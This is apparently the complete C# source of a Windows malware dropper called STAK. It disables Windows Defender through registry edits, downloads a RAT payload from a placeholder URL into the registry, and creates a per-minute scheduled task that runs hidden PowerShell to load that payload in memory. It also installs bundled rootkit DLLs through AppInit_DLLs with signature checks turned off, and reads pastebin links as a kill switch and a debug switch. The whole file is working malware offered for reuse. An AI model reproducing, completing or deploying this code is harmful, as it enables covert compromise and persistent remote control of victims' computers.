using System;
using System.Net;
using Microsoft.Win32;
using System.Diagnostics;
using System.IO;
using STAK.Properties;
using System.Windows.Forms;

namespace STAK
{
    class Program
    {
        static void Main()
        {
            MainRun(); 
            Checker();
            if (debugmode == "debug")
            {
                DialogResult result = MessageBox.Show("Disable Windows Defender?", "DEBUG-MODE", MessageBoxButtons.YesNo);
                if (result == DialogResult.Yes)
                {
                    RegistryEdit(@"SOFTWARE\Microsoft\Windows Defender\Features", "TamperProtection", "0");
                    RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender", "DisableAntiSpyware", "1");
                    RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableBehaviorMonitoring", "1");
                    RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableOnAccessProtection", "1");
                    RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableScanOnRealtimeEnable", "1");
                }
                else
                {
                    MessageBox.Show("Skipping...", "DEBUG-MODE");
                }
            }
            else
            {
                RegistryEdit(@"SOFTWARE\Microsoft\Windows Defender\Features", "TamperProtection", "0");
                RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender", "DisableAntiSpyware", "1");
                RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableBehaviorMonitoring", "1");
                RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableOnAccessProtection", "1");
                RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableScanOnRealtimeEnable", "1");
            }
            if (debugmode == "debug")
            {
                DialogResult result = MessageBox.Show("Run RAT?", "DEBUG-MODE", MessageBoxButtons.YesNo);
                if (result == DialogResult.Yes)
                {
                    string Payload = DownloadPayload("YOUR-STUB-HERE"); // Look at my github page to find out how to place your RAT stub in here.
                    InstallRegistry(Payload);
                    AddToSchtasks();
                }
                else
                {
                    MessageBox.Show("Skipping...", "DEBUG-MODE");
                }
            }
            else
            {
                string Payload = DownloadPayload("YOUR-STUB-HERE"); // Look at my github page to find out how to place your RAT stub in here.
                InstallRegistry(Payload);
                AddToSchtasks();
            }
            try
            {
                if(Environment.Is64BitOperatingSystem)
                {
                    Install(true);
                }
                else
                {
                    Install(false);
                }
            }
            catch {}

        }

        public static string destPath { get; set; }
        public static string debugmode { get; set; }

        private static string DownloadPayload (string url)
        {
            using (WebClient wc = new WebClient())
            {
               return wc.DownloadString(url);
            }
        }

        private static void Checker()
        {
            string url = ("https://pastebin.com/raw/qA3FzffP"); // Look at my github page to find out how to place your checker link in here.
            string debug = new WebClient().DownloadString(url);
            if (debug == "1")
            {
                debugmode = "debug";
            }
        }

        private static void InstallRegistry(string Payload)
        {
            var reg = Registry.CurrentUser.OpenSubKey(@"Software\STAK", true);
            if (reg == null)
            {
                reg = Registry.CurrentUser.CreateSubKey(@"Software\STAK");
                reg.SetValue("N0TH1NGT0S33", Payload);
                return;
            }
            if (reg.GetValue("N0TH1NGT0S33") == null || !reg.GetValue("N0TH1NGT0S33").ToString().Equals(Payload, StringComparison.CurrentCultureIgnoreCase))
            {
                reg.SetValue("N0TH1NGT0S33", Payload);
                return;
            }
        }

        private static void AddToSchtasks()
        {
            string PS = @"powershell -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -NoExit -Command [System.Reflection.Assembly]::Load([System.Convert]::FromBase64String((Get-ItemProperty HKCU:\Software\STAK\).N0TH1NGT0S33)).EntryPoint.Invoke($Null,$Null)";
            Process.Start(new ProcessStartInfo()
            {
                FileName = "schtasks",
                Arguments = "/create /sc minute /mo 1 /tn STAK /tr " + "\"" + PS + "\"",
                CreateNoWindow = true,
                ErrorDialog = false,
                WindowStyle = ProcessWindowStyle.Hidden
            });
        }

        private static void RegistryEdit(string regPath, string name, string value)
        {
            try
            {
                using (RegistryKey key = Registry.LocalMachine.OpenSubKey(regPath, RegistryKeyPermissionCheck.ReadWriteSubTree))
                {
                    if (key == null)
                    {
                        Registry.LocalMachine.CreateSubKey(regPath).SetValue(name, value, RegistryValueKind.DWord);
                        return;
                    }
                    if (key.GetValue(name) != (object)value)
                        key.SetValue(name, value, RegistryValueKind.DWord);
                }
            }
            catch { }
        }

        private static void Install(bool is64bit)
        {
            if (debugmode == "debug")
            {
                DialogResult result = MessageBox.Show("Install rootkit?", "DEBUG-MODE", MessageBoxButtons.YesNo);
                if (result == DialogResult.Yes)
                {
                    if (Environment.Is64BitOperatingSystem)
                    {
                        destPath = Path.Combine(Path.GetTempPath(), "$77-" + Guid.NewGuid().ToString("N") + "-" + Resources.x64);
                        File.WriteAllBytes(destPath, Resources.x64);
                        new FileInfo(destPath).Attributes |= FileAttributes.Temporary;
                    }
                    else
                    {
                        destPath = Path.Combine(Path.GetTempPath(), "$77-" + Guid.NewGuid().ToString("N") + "-" + Resources.x86);
                        File.WriteAllBytes(destPath, Resources.x86);
                        new FileInfo(destPath).Attributes |= FileAttributes.Temporary;
                    }

                    using (RegistryKey key = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, is64bit ? RegistryView.Registry64 : RegistryView.Registry32).OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows", true))
                    {
                        key.SetValue("LoadAppInit_DLLs", 1);
                        key.SetValue("RequireSignedAppInit_DLLs", 0);
                        key.SetValue("AppInit_DLLs", destPath);
                    }
                }
                else
                {
                    MessageBox.Show("Skipping...", "DEBUG-MODE");
                }
            }
            else
            {
                if (Environment.Is64BitOperatingSystem)
                {
                    destPath = Path.Combine(Path.GetTempPath(), "$77-" + Guid.NewGuid().ToString("N") + "-" + Resources.x64);
                    File.WriteAllBytes(destPath, Resources.x64);
                    new FileInfo(destPath).Attributes |= FileAttributes.Temporary;
                }
                else
                {
                    destPath = Path.Combine(Path.GetTempPath(), "$77-" + Guid.NewGuid().ToString("N") + "-" + Resources.x86);
                    File.WriteAllBytes(destPath, Resources.x86);
                    new FileInfo(destPath).Attributes |= FileAttributes.Temporary;
                }

                using (RegistryKey key = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, is64bit ? RegistryView.Registry64 : RegistryView.Registry32).OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows", true))
                {
                    key.SetValue("LoadAppInit_DLLs", 1);
                    key.SetValue("RequireSignedAppInit_DLLs", 0);
                    key.SetValue("AppInit_DLLs", destPath);
                }
            }
        }

        private static void MainRun()
        {
            string url2 = ("https://pastebin.com/raw/70nYGtCq"); string debug2 = new WebClient().DownloadString(url2); if (debug2 == "1")
            { Application.Exit(); }
        }
    }
}